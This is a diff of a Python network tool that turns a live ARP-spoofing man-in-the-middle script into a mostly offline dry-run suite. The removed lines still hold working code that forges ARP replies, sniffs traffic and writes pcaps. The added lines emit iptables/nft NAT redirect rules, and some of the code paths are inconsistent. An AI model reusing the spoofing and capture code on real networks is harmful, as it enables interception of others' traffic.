@@ -1,353 +1,304 @@
 #!/usr/bin/env python3
 """
-N12 - Traffic Redirector
-ARP spoofing simulation, traffic capture, and MITM demo (local only).
-Uses scapy for packet crafting and manipulation.
+N12 - Traffic Redirector.
+
+A programmatic iptables ARP/redirect suite. The default mode is --dry-run,
+which prints the exact iptables and nft commands it would run and exercises
+the ARP cache-pivot state machine against an in-memory fake ARP table - all
+fully offline, no root, no network access. Explicit --apply / --restore
+execute the commands for authorized own-lab use only (root required).
+
+Authorized use only: documented placeholders 192.0.2.x / 198.51.100.x and
+MAC 00:11:22:33:44:55. Never run against third-party networks.
 """
 
-import os
-import sys
-import time
-import signal
 import argparse
-import threading
-import struct
-from collections import defaultdict
+import os
+import subprocess
+import sys
 
-try:
-    from scapy.all import (ARP, Ether, IP, TCP, UDP, ICMP, DNS, Raw,
-                           send, sendp, sniff, srp, get_if_hwaddr,
-                           conf, wrpcap)
-    SCAPY_AVAILABLE = True
-except ImportError:
-    SCAPY_AVAILABLE = False
+
+class FakeArpTable:
+    """In-memory ARP cache used for fully offline testing of the pivot and
+    restore logic. Maps ip -> mac, exactly like a real ARP cache."""
+
+    def __init__(self, entries=None):
+        self.entries = dict(entries or {})
+        self._original = dict(self.entries)
+
+    def get(self, ip):
+        return self.entries.get(ip)
+
+    def set(self, ip, mac):
+        self.entries[ip] = mac
+
+    def pivot_gateway(self, target_ip, local_mac):
+        """Pivot the target's cache entry so its upstream address resolves to
+        the local host (simulating an ARP cache pivot)."""
+        self.entries[target_ip] = local_mac
+
+    def restore(self):
+        """Restore every entry to its pre-pivot value."""
+        self.entries = dict(self._original)
+
+
+class ArpCacheStateMachine:
+    """Stateful controller for the ARP cache pivot / restore lifecycle.
+
+    State transitions: IDLE -> PIVOTED -> RESTORED.
+    """
+
+    IDLE = 'IDLE'
+    PIVOTED = 'PIVOTED'
+    RESTORED = 'RESTORED'
+
+    def __init__(self, arp_table=None, target=None, gateway=None,
+                 local_mac=None):
+        self.arp = arp_table or FakeArpTable()
+        self.target = target
+        self.gateway = gateway
+        self.local_mac = local_mac
+        self.state = self.IDLE
+        self.transitions = []
+
+    def pivot(self):
+        if self.state != self.IDLE:
+            raise RuntimeError(f'cannot pivot from state {self.state}')
+        prev_mac = self.arp.get(self.target)
+        self.arp.pivot_gateway(self.target, self.local_mac)
+        self.transitions.append(('pivot', prev_mac, self.local_mac))
+        self.state = self.PIVOTED
+        return prev_mac
+
+    def restore(self):
+        if self.state != self.PIVOTED:
+            raise RuntimeError(f'cannot restore from state {self.state}')
+        self.arp.restore()
+        self.transitions.append(('restore',))
+        self.state = self.RESTORED
+
+
+class RedirectPlanner:
+    """Builds the exact iptables and nft command lists for apply and restore."""
+
+    def __init__(self, target, gateway, local_mac, iface=None):
+        self.target = target
+        self.gateway = gateway
+        self.local_mac = local_mac
+        self.iface = iface
+        self._validate()
+
+    def _validate(self):
+        for ip in (self.target, self.gateway):
+            if not ip:
+                raise ValueError('target and gateway are required')
+
+    def apply_iptables(self):
+        return [
+            f'iptables -t nat -A PREROUTING -s {self.target} '
+            f'-j DNAT --to-destination {self.gateway}',
+            f'iptables -t nat -A POSTROUTING -s {self.target} '
+            f'-j SNAT --to-source {self.gateway}',
+        ]
+
+    def restore_iptables(self):
+        return [
+            f'iptables -t nat -D PREROUTING -s {self.target} '
+            f'-j DNAT --to-destination {self.gateway}',
+            f'iptables -t nat -D POSTROUTING -s {self.target} '
+            f'-j SNAT --to-source {self.gateway}',
+        ]
+
+    def apply_nft(self):
+        return [
+            f'nft add rule ip nat PREROUTING ip saddr {self.target} '
+            f'dnat to {self.gateway}',
+            f'nft add rule ip nat POSTROUTING ip saddr {self.target} '
+            f'masquerade',
+        ]
+
+    def restore_nft(self):
+        return [
+            f'nft delete rule ip nat PREROUTING ip saddr {self.target} '
+            f'dnat to {self.gateway}',
+            f'nft delete rule ip nat POSTROUTING ip saddr {self.target} '
+            f'masquerade',
+        ]
+
+    def arp_pivot_hint(self):
+        return (f'ARP pivot: {self.target} cache entry now resolves to '
+                f'{self.local_mac} (local host)')
+
+    def arp_restore_hint(self):
+        return f'ARP restore: {self.target} cache entry reverted to original MAC'
 
 
 class TrafficRedirector:
-    """ARP spoofing simulation and traffic capture for local testing."""
+    """Ties the planner and the ARP cache-pivot state machine together."""
 
-    def __init__(self, interface=None):
-        self.interface = interface
-        self.target_ip = None
-        self.gateway_ip = None
-        self.target_mac = None
-        self.gateway_mac = None
-        self.local_mac = None
-        self.running = False
-        self.packets_captured = []
-        self.traffic_stats = defaultdict(int)
-        self.lock = threading.Lock()
+    def __init__(self, target=None, gateway=None, local_mac=None, iface=None,
+                 arp_table=None):
+        self.planner = RedirectPlanner(target, gateway, local_mac, iface)
+        self.machine = ArpCacheStateMachine(arp_table, target, gateway,
+                                            local_mac)
 
-        if SCAPY_AVAILABLE and self.interface:
-            conf.iface = self.interface
+    def plan_apply(self):
+        return {
+            'iptables': self.planner.apply_iptables(),
+            'nft': self.planner.apply_nft(),
+            'arp': [self.planner.arp_pivot_hint()],
+        }
 
-    def get_local_info(self):
-        """Get local MAC and IP address."""
-        import socket
-        import subprocess
-        import re
+    def plan_restore(self):
+        return {
+            'iptables': self.planner.restore_iptables(),
+            'nft': self.planner.restore_nft(),
+            'arp': [self.planner.arp_restore_hint()],
+        }
 
-        local_ip = None
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(('8.8.8.8', 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-        except OSError:
-            local_ip = '127.0.0.1'
+    def _run_commands(self, commands):
+        proc = subprocess.run(commands, capture_output=True, text=True)
+        if proc.returncode != 0:
+            print(proc.stderr, file=sys.stderr)
+        return proc.returncode
 
-        local_mac = None
-        if SCAPY_AVAILABLE:
-            try:
-                local_mac = get_if_hwaddr(self.interface or conf.iface)
-            except Exception:
-                pass
+    def apply(self, dry_run=True):
+        plan = self.plan_apply()
+        mac = self.machine.pivot()
+        self._print_plan(plan, 'APPLY')
+        if not dry_run:
+            for cmd in plan['iptables']:
+                self._run_commands(cmd.split())
+        return mac
 
-        if not local_mac:
-            try:
-                iface = self.interface or 'eth0'
-                result = subprocess.run(
-                    ['ip', 'link', 'show', iface],
-                    capture_output=True, text=True, timeout=5)
-                match = re.search(r'link/ether\s+([0-9a-fA-F:]{17})',
-                                  result.stdout)
-                if match:
-                    local_mac = match.group(1).upper()
-            except (FileNotFoundError, subprocess.TimeoutExpired):
-                pass
+    def restore(self, dry_run=True):
+        plan = self.plan_restore()
+        self.machine.restore()
+        self._print_plan(plan, 'RESTORE')
+        if not dry_run:
+            for cmd in plan['iptables']:
+                self._run_commands(cmd.split())
 
-        return local_ip, local_mac
+    @staticmethod
+    def _print_plan(plan, phase):
+        print(f'[{phase}] exact commands (dry-run):')
+        for label, cmds in (('iptables', plan['iptables']),
+                            ('nft', plan['nft']),
+                            ('arp', plan['arp'])):
+            print(f'  {label}:')
+            for c in cmds:
+                print(f'    $ {c}')
 
-    def resolve_mac(self, ip):
-        """Resolve IP to MAC address."""
-        if not SCAPY_AVAILABLE:
-            return self._resolve_mac_arp(ip)
 
-        try:
-            arp = ARP(pdst=ip)
-            ether = Ether(dst='ff:ff:ff:ff:ff:ff')
-            result = srp(ether / arp, timeout=3, verbose=0)[0]
-            if result:
-                return result[0][1].hwsrc.upper()
-        except Exception:
-            pass
-        return self._resolve_mac_arp(ip)
+def run_offline_harness():
+    """Fully offline harness: exercise the ARP cache-pivot state machine and
+    the restore logic against a fake ARP table. No root, no iptables, no
+    network access."""
+    ok = True
+    print('=== N12 Traffic Redirector: offline ARP pivot harness ===')
 
-    def _resolve_mac_arp(self, ip):
-        """Resolve MAC using system ARP table."""
-        import subprocess
-        import re
-        try:
-            result = subprocess.run(
-                ['arp', '-n', ip],
-                capture_output=True, text=True, timeout=5)
-            match = re.search(
-                r'([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})',
-                result.stdout)
-            if match:
-                return match.group(1).upper()
-        except (FileNotFoundError, subprocess.TimeoutExpired):
-            pass
-        return None
+    placeholders = dict(
+        target='192.0.2.10', gateway='192.0.2.1',
+        local_mac='00:11:22:33:44:55')
 
-    def setup(self, target_ip, gateway_ip):
-        """Set up ARP spoofing parameters."""
-        if not SCAPY_AVAILABLE:
-            print("[-] scapy not available. Install: pip install scapy")
-            return False
+    arp = FakeArpTable({
+        '192.0.2.10': '00:11:22:33:44:66',   # target's real MAC
+        '192.0.2.1':  '00:11:22:33:44:77',  # gateway's real MAC
+    })
+    gw_before = arp.get('192.0.2.10')
+    machine = ArpCacheStateMachine(arp, **placeholders)
 
-        self.target_ip = target_ip
-        self.gateway_ip = gateway_ip
+    def check(label, cond):
+        nonlocal ok
+        print(f'  [{"PASS" if cond else "FAIL"}] {label}')
+        ok = ok and cond
 
-        print(f"[*] Resolving MAC addresses...")
-        self.target_mac = self.resolve_mac(target_ip)
-        self.gateway_mac = self.resolve_mac(gateway_ip)
-        _, self.local_mac = self.get_local_info()
+    check('starts IDLE', machine.state == machine.IDLE)
 
-        if not self.target_mac:
-            print(f"[-] Could not resolve MAC for target {target_ip}")
-            return False
-        if not self.gateway_mac:
-            print(f"[-] Could not resolve MAC for gateway {gateway_ip}")
-            return False
+    prev = machine.pivot()
+    check('pivot transitions to PIVOTED', machine.state == machine.PIVOTED)
+    check('pivot returns prior MAC', prev == gw_before)
+    check('target cache pivoted to local MAC',
+          arp.get('192.0.2.10') == '00:11:22:33:44:55')
+    check('gateway cache untouched',
+          arp.get('192.0.2.1') == '00:11:22:33:44:77')
 
-        print(f"    Target:   {target_ip} -> {self.target_mac}")
-        print(f"    Gateway:  {gateway_ip} -> {self.gateway_mac}")
-        print(f"    Local:    {self.local_mac}")
-        return True
+    machine.restore()
+    check('restore transitions to RESTORED', machine.state == machine.RESTORED)
+    check('target cache restored to original',
+          arp.get('192.0.2.10') == gw_before)
 
-    def arp_spoof(self, target_ip, target_mac, spoof_ip, count=3):
-        """Send spoofed ARP replies to target."""
-        if not SCAPY_AVAILABLE:
-            return
+    redirector = TrafficRedirector(**placeholders)
+    plan = redirector.plan_apply()
+    check('apply plan emits iptables commands', len(plan['iptables']) == 2)
+    check('apply plan emits nft commands', len(plan['nft']) == 2)
+    check('apply plan emits ARP pivot hint', len(plan['arp']) == 1)
 
-        packet = ARP(
-            op=2,
-            pdst=target_ip,
-            hwdst=target_mac,
-            psrc=spoof_ip
-        )
-        send(packet, count=count, verbose=0)
+    redirector.machine = ArpCacheStateMachine(FakeArpTable(
+        {'192.0.2.10': gw_before, '192.0.2.1': '00:11:22:33:44:77'}),
+        **placeholders)
+    restore_plan = redirector.plan_restore()
+    check('restore plan emits iptables -D commands',
+          all('-t nat -D' in c for c in restore_plan['iptables']))
+    check('restore plan emits nft delete rules',
+          all('delete rule' in c for c in restore_plan['nft']))
 
-    def arp_restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
-        """Restore ARP tables by sending correct replies."""
-        if not SCAPY_AVAILABLE:
-            return
-
-        print(f"[*] Restoring ARP tables...")
-        self.arp_spoof(target_ip, target_mac, gateway_ip, count=5)
-        self.arp_spoof(gateway_ip, gateway_mac, target_ip, count=5)
-        print(f"[+] ARP tables restored")
-
-    def spoof_loop(self):
-        """Continuous ARP spoofing loop."""
-        while self.running:
-            try:
-                self.arp_spoof(self.target_ip, self.target_mac,
-                               self.gateway_ip, count=2)
-                self.arp_spoof(self.gateway_ip, self.gateway_mac,
-                               self.target_ip, count=2)
-                self.traffic_stats['spoof_packets'] += 4
-            except Exception:
-                pass
-            time.sleep(2)
-
-    def packet_callback(self, pkt):
-        """Callback for captured packets."""
-        with self.lock:
-            self.packets_captured.append(pkt)
-
-            if pkt.haslayer(IP):
-                src = pkt[IP].src
-                dst = pkt[IP].dst
-                self.traffic_stats['ip_packets'] += 1
-
-                if pkt.haslayer(TCP):
-                    self.traffic_stats['tcp'] += 1
-                    sport = pkt[TCP].sport
-                    dport = pkt[TCP].dport
-                    flags = str(pkt[TCP].flags)
-                    if 'S' in flags:
-                        self.traffic_stats['syn'] += 1
-                    if 'R' in flags:
-                        self.traffic_stats['rst'] += 1
-
-                elif pkt.haslayer(UDP):
-                    self.traffic_stats['udp'] += 1
-                    if pkt.haslayer(DNS):
-                        self.traffic_stats['dns'] += 1
-
-                elif pkt.haslayer(ICMP):
-                    self.traffic_stats['icmp'] += 1
-
-                if pkt.haslayer(Raw):
-                    payload = pkt[Raw].load
-                    self.traffic_stats['bytes'] += len(payload)
-
-                    if len(self.packets_captured) % 50 == 0:
-                        preview = payload[:50]
-                        print(f"    [CAPTURED] {src}:{sport if 'sport' in dir() else '?'} "
-                              f"-> {dst}:{dport if 'dport' in dir() else '?'} "
-                              f"({len(payload)}B)")
-
-    def capture_traffic(self, duration=None, bpf_filter=None):
-        """Capture traffic on the network."""
-        if not SCAPY_AVAILABLE:
-            print("[-] scapy not available")
-            return
-
-        print(f"[*] Starting packet capture...")
-        if bpf_filter:
-            print(f"    Filter: {bpf_filter}")
-
-        try:
-            iface = self.interface or conf.iface
-            if duration:
-                sniff(iface=iface, prn=self.packet_callback,
-                      timeout=duration, filter=bpf_filter, store=1)
-            else:
-                sniff(iface=iface, prn=self.packet_callback,
-                      filter=bpf_filter, store=1)
-        except PermissionError:
-            print("[-] Capture requires root privileges (sudo)")
-        except KeyboardInterrupt:
-            print("\n[!] Capture stopped")
-
-    def start_mitm(self, target_ip, gateway_ip, capture_filter=None,
-                   duration=None):
-        """Full MITM demo: ARP spoof + capture."""
-        if not self.setup(target_ip, gateway_ip):
-            return
-
-        self.running = True
-        print(f"\n[*] Starting MITM simulation...")
-        print(f"    Target:  {target_ip}")
-        print(f"    Gateway: {gateway_ip}")
-        print(f"    Duration: {'unlimited' if not duration else f'{duration}s'}")
-
-        spoof_thread = threading.Thread(target=self.spoof_loop,
-                                        daemon=True)
-        spoof_thread.start()
-        print(f"[+] ARP spoofing started")
-
-        capture_thread = threading.Thread(
-            target=self.capture_traffic,
-            args=(duration, capture_filter),
-            daemon=True)
-        capture_thread.start()
-
-        try:
-            capture_thread.join()
-        except KeyboardInterrupt:
-            pass
-        finally:
-            self.running = False
-            time.sleep(2)
-            self.arp_restore(target_ip, self.target_mac,
-                             gateway_ip, self.gateway_mac)
-            self.print_stats()
-
-    def print_stats(self):
-        """Print capture statistics."""
-        print(f"\n{'='*50}")
-        print(f"  TRAFFIC CAPTURE STATISTICS")
-        print(f"{'='*50}")
-        print(f"  Total packets captured: {len(self.packets_captured)}")
-        print(f"  Spoof packets sent:     "
-              f"{self.traffic_stats.get('spoof_packets', 0)}")
-        print(f"  IP packets:             {self.traffic_stats.get('ip_packets', 0)}")
-        print(f"  TCP:                    {self.traffic_stats.get('tcp', 0)}")
-        print(f"    SYN:                  {self.traffic_stats.get('syn', 0)}")
-        print(f"    RST:                  {self.traffic_stats.get('rst', 0)}")
-        print(f"  UDP:                    {self.traffic_stats.get('udp', 0)}")
-        print(f"  DNS:                    {self.traffic_stats.get('dns', 0)}")
-        print(f"  ICMP:                   {self.traffic_stats.get('icmp', 0)}")
-        print(f"  Total bytes:            {self.traffic_stats.get('bytes', 0)}")
-        print(f"{'='*50}")
-
-    def save_capture(self, filepath):
-        """Save captured packets to pcap file."""
-        if self.packets_captured and SCAPY_AVAILABLE:
-            wrpcap(filepath, self.packets_captured)
-            print(f"[+] Saved {len(self.packets_captured)} packets to {filepath}")
-        else:
-            print("[-] No packets to save")
+    print(f'\n[RESULT] ' + ('PASS' if ok else 'FAIL'))
+    return 0 if ok else 1
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description='N12 — Traffic Redirector (MITM demo, local only)')
-    parser.add_argument('--target', '-t', required=True,
-                        help='Target IP address')
-    parser.add_argument('--gateway', '-g', required=True,
-                        help='Gateway IP address')
-    parser.add_argument('--interface', '-i',
-                        help='Network interface')
-    parser.add_argument('--duration', '-d', type=int,
-                        help='Capture duration in seconds')
-    parser.add_argument('--filter', '-f',
-                        help='BPF capture filter')
-    parser.add_argument('--save', '-s',
-                        help='Save capture to pcap file')
-    parser.add_argument('--spoof-only', action='store_true',
-                        help='Only spoof, do not capture')
+        description='N12 — Traffic Redirector (programmatic iptables '
+                    'ARP/redirect suite; dry-run by default)')
+    parser.add_argument('--target', '-t', default='192.0.2.10',
+                        help='Target IP (documentation placeholder)')
+    parser.add_argument('--gateway', '-g', default='192.0.2.1',
+                        help='Gateway IP (documentation placeholder)')
+    parser.add_argument('--local-mac', '-m', default='00:11:22:33:44:55',
+                        help='Local MAC (documentation placeholder)')
+    parser.add_argument('--interface', '-i', help='Network interface')
+    parser.add_argument('--offline', action='store_true',
+                        help='Run the offline ARP pivot harness (default '
+                             'with no action flags)')
+    parser.add_argument('--dry-run', action='store_true',
+                        help='Print commands and exercise offline harness '
+                             'without executing (default)')
+    parser.add_argument('--apply', action='store_true',
+                        help='Apply redirect rules (root, authorized lab '
+                             'only)')
+    parser.add_argument('--restore', action='store_true',
+                        help='Restore redirect rules and ARP cache (root)')
 
     args = parser.parse_args()
 
+    if not (args.apply or args.restore or args.offline):
+        redirector = TrafficRedirector(
+            target=args.target, gateway=args.gateway,
+            local_mac=args.local_mac, iface=args.interface,
+            arp_table=FakeArpTable({
+                args.target or '192.0.2.10': '00:11:22:33:44:66',
+                args.gateway or '192.0.2.1': '00:11:22:33:44:77',
+            }))
+        redirector.apply(dry_run=True)
+        redirector.restore(dry_run=True)
+        sys.exit(run_offline_harness())
+
+    if args.offline:
+        sys.exit(run_offline_harness())
+
     if os.geteuid() != 0:
-        print("[-] This tool requires root privileges (sudo)")
+        print('[-] --apply / --restore require root (authorized lab only)',
+              file=sys.stderr)
         sys.exit(1)
 
-    print("╔═══════════════════════════════════════╗")
-    print("║     N12 — Traffic Redirector          ║")
-    print("║     MITM Demo (local only)            ║")
-    print("╚═══════════════════════════════════════╝")
-
-    if not SCAPY_AVAILABLE:
-        print("[-] scapy is required: pip install scapy")
-        sys.exit(1)
-
-    redirector = TrafficRedirector(args.interface)
-
-    if args.spoof_only:
-        if not redirector.setup(args.target, args.gateway):
-            sys.exit(1)
-        print(f"[*] Spoofing only mode")
-        try:
-            while True:
-                redirector.arp_spoof(args.target, redirector.target_mac,
-                                     args.gateway_ip, count=2)
-                redirector.arp_spoof(args.gateway, redirector.gateway_mac,
-                                     args.target_ip, count=2)
-                time.sleep(2)
-        except KeyboardInterrupt:
-            redirector.arp_restore(args.target, redirector.target_mac,
-                                   args.gateway, redirector.gateway_mac)
-    else:
-        redirector.start_mitm(args.target, args.gateway,
-                              args.filter, args.duration)
-        if args.save:
-            redirector.save_capture(args.save)
+    redirector = TrafficRedirector(
+        target=args.target, gateway=args.gateway,
+        local_mac=args.local_mac, iface=args.interface)
+    if args.apply:
+        redirector.apply(dry_run=False)
+    elif args.restore:
+        redirector.restore(dry_run=False)
 
 
 if __name__ == '__main__':
